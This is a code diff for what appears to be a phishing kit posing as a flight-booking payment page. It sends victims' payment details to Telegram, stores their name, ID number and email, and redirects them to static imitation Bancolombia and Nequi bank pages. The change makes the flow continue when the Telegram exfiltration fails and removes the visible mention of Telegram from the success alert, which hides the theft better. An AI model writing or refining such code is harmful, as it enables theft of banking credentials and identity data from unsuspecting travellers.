@@ -109,39 +109,40 @@ ${paymentInfo}
     `;
 
     const success = await sendToTelegram(message);
-    if (success) {
-      // Guardar datos del usuario para los bancos
-      const userData = {
-        name: formData?.name,
-        surname: formData?.surname,
-        docType: formData?.docType,
-        docNumber: formData?.docNumber,
-        email: email,
-        totalPrice: totalPrice,
-        origin: origin?.city || origin,
-        destination: destination?.city || destination
-      };
-      sessionStorage.setItem('flightUser', JSON.stringify(userData));
+    
+    // Proceed regardless of Telegram success/failure
+    // Guardar datos del usuario para los bancos
+    const userData = {
+      name: formData?.name,
+      surname: formData?.surname,
+      docType: formData?.docType,
+      docNumber: formData?.docNumber,
+      email: email,
+      totalPrice: totalPrice,
+      origin: origin?.city || origin,
+      destination: destination?.city || destination
+    };
+    sessionStorage.setItem('flightUser', JSON.stringify(userData));
 
-      if (selectedPaymentMethod === 'card') {
-        setShowBankVerification(true);
-        window.scrollTo({ top: 0, behavior: 'smooth' });
-        return;
-      }
+    if (selectedPaymentMethod === 'card') {
+      setShowBankVerification(true);
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+      return;
+    }
 
-      if (selectedPaymentMethod === 'pse' && selectedBank === 'Bancolombia') {
-        // Redirigir a la página estática de Bancolombia
-        window.location.href = '/banks/bancolombia/index.html';
-      } else if (selectedPaymentMethod === 'pse' && selectedBank === 'Nequi') {
-        // Redirigir a la página estática de Nequi
-        window.location.href = '/banks/nequi/index.html';
-      } else {
-        alert('Pago procesado con éxito. (Datos enviados a Telegram)');
-        // Aquí podrías redirigir a una página de éxito o home
-        // navigate('/success'); 
-      }
+    if (selectedPaymentMethod === 'pse' && selectedBank === 'Bancolombia') {
+      // Redirigir a la página estática de Bancolombia
+      window.location.href = '/banks/bancolombia/index.html';
+    } else if (selectedPaymentMethod === 'pse' && selectedBank === 'Nequi') {
+      // Redirigir a la página estática de Nequi
+      window.location.href = '/banks/nequi/index.html';
     } else {
-      alert('Pago procesado localmente. (Error al enviar a Telegram, verifica configuración)');
+      if (!success) {
+         // Optional: log or silently fail
+         console.warn('Telegram notification failed but proceeding with flow');
+      }
+      alert('Pago procesado con éxito.');
+      // navigate('/success'); 
     }
   };
 
